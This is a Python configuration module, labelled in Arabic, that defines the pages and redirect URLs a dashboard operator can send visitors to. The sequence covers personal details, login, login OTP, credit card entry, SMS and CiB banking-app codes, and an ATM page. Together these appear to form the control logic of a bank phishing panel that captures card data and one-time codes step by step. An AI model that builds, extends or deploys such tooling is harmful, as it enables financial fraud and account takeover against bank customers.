PAGE_CHOICES = (
    {
        'page': 'home',
        'label': 'الرئيسية',
        'icon': 'fa-house',
        'url': '/index.html',
        'match_tokens': ('index', 'home'),
        'match_priority': 60,
    },
    {
        'page': 'registration',
        'label': 'معلومات الشخصية',
        'icon': 'fa-clipboard-list',
        'url': '/registration.html',
        'match_tokens': ('registration',),
        'match_priority': 20,
    },
    {
        'page': 'login',
        'label': 'تسجيل الدخول',
        'icon': 'fa-right-to-bracket',
        'url': '/login.html',
        'match_tokens': ('login',),
        'match_priority': 40,
    },
    {
        'page': 'login-otp',
        'label': 'رمز التحقق - تسجيل الدخول',
        'icon': 'fa-shield-halved',
        'url': '/login-otp.html',
        'match_tokens': ('login-otp',),
        'match_priority': 30,
    },
    {
        'page': 'payment',
        'label': 'بطاقة الائتمان',
        'icon': 'fa-credit-card',
        'url': '/payment.html',
        'match_tokens': ('payment',),
        'match_priority': 50,
    },
    {
        'page': 'phone-otp',
        'label': 'رمز تحقق البطاقة - SMS',
        'icon': 'fa-mobile-screen-button',
        'url': '/phone-otp.html',
        'match_tokens': ('phone-otp',),
        'match_priority': 10,
    },
    {
        'page': 'app-otp',
        'label': 'رمز تحقق البطاقة - CiB',
        'icon': 'fa-mobile-screen',
        'url': '/app-otp.html',
        'match_tokens': ('app-otp',),
        'match_priority': 11,
    },
    {
        'page': 'atm',
        'label': 'ATM',
        'icon': 'fa-building-columns',
        'url': '/atm.html',
        'match_tokens': ('atm',),
        'match_priority': 12,
    },
    {
        'page': 'verification-success',
        'label': 'أنهاء عملية التسجيل',
        'icon': 'fa-circle-check',
        'url': '/sucess.html',
        'match_tokens': ('verification-success', 'sucess', 'success'),
        'match_priority': 99,
    },
)

PAGE_CHOICES_BY_KEY = {choice['page']: choice for choice in PAGE_CHOICES}


def page_choices_for_dashboard() -> list[dict]:
    return [
        {
            'page': choice['page'],
            'label': choice['label'],
            'icon': choice['icon'],
            'url': choice['url'],
            'match_tokens': list(choice['match_tokens']),
            'match_priority': choice['match_priority'],
        }
        for choice in PAGE_CHOICES
    ]


def page_key_from_source(source_page: str) -> str:
    source = str(source_page or '').lower()
    if not source:
        return ''
    for choice in sorted(PAGE_CHOICES, key=lambda row: row['match_priority']):
        if any(token in source for token in choice['match_tokens']):
            return choice['page']
    return ''


def page_label_from_source(source_page: str) -> str:
    key = page_key_from_source(source_page)
    if key:
        return PAGE_CHOICES_BY_KEY[key]['label']
    return str(source_page or '')


def redirect_url_for_page(page: str) -> str:
    return PAGE_CHOICES_BY_KEY.get(str(page or '').strip(), {}).get('url', '')
